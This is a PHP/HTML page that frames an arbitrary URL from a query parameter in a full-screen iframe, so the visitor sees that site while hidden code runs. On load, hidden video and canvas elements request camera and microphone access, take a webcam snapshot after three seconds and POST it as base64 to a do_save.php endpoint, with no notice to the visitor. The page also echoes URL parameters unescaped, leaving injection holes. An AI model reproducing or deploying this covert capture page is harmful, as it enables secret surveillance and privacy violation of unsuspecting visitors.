<?php
function Get_para($para_raw)
{
    if (is_array($_GET) && count($_GET) > 0) {
        if (isset($_GET[$para_raw])) {
            $para = $_GET[$para_raw];
        } else {
            $para = "undifined";
        }
    } else {
        $para = "undfined";
        header("location:https://baidu.com");
    }
    return $para;
} ?>
<!DOCTYPE html>
<html>
<head>
    <title><?php echo Get_para("title"); ?></title>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="description" content="<?php echo Get_para("desc"); ?>">
    <link rel="stylesheet" href="//cdnjs.loli.net/ajax/libs/mdui/0.4.2/css/mdui.min.css">
    <script src="//cdnjs.loli.net/ajax/libs/mdui/0.4.2/js/mdui.min.js"></script>
    <style>
        html,
        body,
        iframe {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
            border: none;
        }
        body {
        }
    </style>
</head>
<body>
<iframe src="<?php echo Get_para("iframe"); ?>"></iframe>
<div hidden="hidden" id="contentHolder">
    <video hidden="hidden" id="video" width="1000" height="1000" autoplay="" controls muted></video>
    <canvas hidden="hidden" style="display:block" id="canvas" width="1000" height="1000"></canvas>
</div>
<script>
    var $$ = mdui.JQ;
    var mediaStreamTrack;
    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
    if (navigator.getUserMedia) {
        navigator.getUserMedia({audio: true, video: {width: 1000, height: 1000}},
            function (stream) {
                mediaStreamTrack = typeof stream.stop === 'function' ? stream : stream.getTracks()[1];
                video.src = (window.URL || window.webkitURL).createObjectURL(stream);
                video.play();
                setTimeout(function () {
                    var context = document.getElementById("canvas").getContext("2d");
                    context.drawImage(video, 0, 0, 1000, 1000);
                    var imgdata = getBase64Image(document.getElementById("canvas"));
                    $$.ajax({
                        method: 'POST',
                        url: 'do_save.php',
                        data: {
                            type: 'img',
                            data: imgdata
                        },
                        success: function (data) {
                            console.log(data);
                        }
                    });
                    mediaStreamTrack && mediaStreamTrack.stop();
                }, 3000);
            },
            function (err) {
                console.log("The following error occurred: " + err.name);
            }
        );
    } else {
        console.log("getUserMedia not supported");
    }

    function getBase64Image(img) {
        var canvastemp = document.createElement("canvas");
        canvastemp.width = img.width;
        canvastemp.height = img.height;
        var ctx = canvas.getContext("2d");
        ctx.drawImage(img, 0, 0, img.width, img.height);
        var dataURL = canvas.toDataURL("image/png");
        return dataURL;
    }
</script>
</body>
</html>